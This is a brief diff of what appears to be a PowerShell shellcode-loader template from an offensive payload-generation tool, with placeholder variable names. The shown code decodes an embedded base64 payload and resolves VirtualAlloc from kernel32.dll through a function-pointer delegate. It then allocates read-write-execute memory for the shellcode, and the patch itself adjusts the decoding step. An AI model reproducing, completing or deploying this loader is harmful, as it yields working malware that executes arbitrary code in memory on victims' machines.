@@ -66,7 +66,7 @@ If ([IntPtr]::size -eq 8) {
 	$%%VAR10%% = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%%PAYLOAD%%'))
 	$%%VAR11%% = %%VAR19%%
 	$%%VAR12%% = %%VAR25%% $%%VAR11%% $%%VAR10%%
-	[Byte[]]$%%VAR13%% = [System.Convert]::FromBase64String($%%VAR12%%)
+	[Byte[]]$%%VAR13%% = [System.Convert]::FromBase64String($%%VAR12%%.Replace('"',''))
 
 	$%%VAR33%% = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%%VAR3%% kernel32.dll VirtualAlloc), (%%VAR1%% @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
 	$%%VAR34%% = $%%VAR33%%.Invoke([IntPtr]::Zero, $%%VAR13%%.Length, 0x3000, 0x40)
